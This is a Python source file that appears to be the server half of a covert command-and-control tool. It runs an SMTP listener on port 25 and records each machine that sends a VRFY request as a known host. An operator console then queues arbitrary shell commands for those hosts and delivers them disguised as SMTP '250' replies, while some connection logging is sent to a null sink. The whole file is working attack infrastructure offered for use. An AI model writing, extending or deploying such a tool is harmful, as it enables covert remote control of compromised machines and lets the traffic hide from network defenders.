"""
TBH, this could be called cargocult.py because that's what it is
"""

import asyncore
import asynchat
import socket
import time
import errno
import threading
from smtpd import *

class Devnull:
    def write(self, msg): pass
    def flush(self): pass

class MailHandler(SMTPChannel):
    def __init__(self, server, conn, addr, data_size_limit=33554432,
                 map=None, enable_SMTPUTF8=False, decode_data=False):
        asynchat.async_chat.__init__(self, conn, map=map)
        self.smtp_server = server
        self.conn = conn
        self.addr = addr
        self.data_size_limit = data_size_limit
        self.enable_SMTPUTF8 = enable_SMTPUTF8
        self._decode_data = decode_data
        if enable_SMTPUTF8 and decode_data:
            raise ValueError("decode_data and enable_SMTPUTF8 cannot"
                             " be set to True at the same time")
        if decode_data:
            self._emptystring = ''
            self._linesep = '\r\n'
            self._dotsep = '.'
            self._newline = "\n"
        else:
            self._emptystring = b''
            self._linesep = b'\r\n'
            self._dotsep = ord(b'.')
            self._newline = b'\n'
        self._set_rset_state()
        self.seen_greeting = ''
        self.extended_smtp = False
        self.command_size_limits.clear()
        self.fqdn = socket.getfqdn()
        try:
            self.peer = conn.getpeername()
        except OSError as err:
            # a race condition  may occur if the other end is closing
            # before we can get the peername
            self.close()
            if err.args[0] != errno.ENOTCONN:
                raise
            return
        print('Peer:', repr(self.peer), file=Devnull())
        self.push('220 %s' % (self.fqdn))

    def smtp_VRFY(self, arg):
        print("Received VRFY for: ",arg)
        if arg in self.smtp_server.waitingCommands:
            print("Deploying command:", self.smtp_server.waitingCommands[arg], "to", arg)
            self.push("250 "+self.smtp_server.waitingCommands[arg])
            self.smtp_server.waitingCommands.pop(arg, None)
        else:
            print("No command to deploy for", arg)
            self.push("252 Perhaps.")
            if not arg in self.smtp_server.knownHosts:
                self.smtp_server.knownHosts.append(arg)
    # def smtp_RCPT(self, arg):
    #     self.push("250 NANI?")


class MailmanServer(SMTPServer):
    waitingCommands = dict()
    knownHosts = []
    def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
        print("Message received from: ", mailfrom)
        print("Data: ", data.decode("UTF-8"))

    # def handle_accept(self):
        conn, addr = self.accept()
    #     # print >> DEBUGSTREAM, 'Incoming connection from %s' % repr(addr)
    #     channel_class = MailHandler(self, conn, addr)
    # channel_class = MailHandler()
    def handle_accepted(self, conn, addr):
        print('Incoming connection from %s' % repr(addr), file=Devnull())
        channel = MailHandler(self,
                                     conn,
                                     addr,
                                     self.data_size_limit,
                                     self._map,
                                     self.enable_SMTPUTF8,
                                     self._decode_data)

def machineList(machines):
    if len(machines) == 0:
        print("No known machines.")
        return
    for i in range(len(machines)):
        print(i, ":  ",machines[i])

def run():
    foo = MailmanServer(("0.0.0.0", 25), None)
    print("Server launched.")
    print("Commands:")
    print("         l - List known machines")
    print("         c # - Set command for machine #")
    # try:
    #     asyncore.loop()
    # except KeyboardInterrupt:
    #     pass
    thread = threading.Thread(target=asyncore.loop, kwargs={'timeout': 1})
    thread.start()
    while True:
        cmd = input("mailman# ")
        if cmd == "" or cmd == None:
            continue
        if cmd == "l":
            machineList(foo.knownHosts)
        elif cmd[0] == "c":
            target = int(cmd.split(" ")[1])
            targetCmd = input("Target$ ")
            foo.waitingCommands[foo.knownHosts[target]] = targetCmd
        else:
            print("Unknown command.")

if __name__ == "__main__":
    run()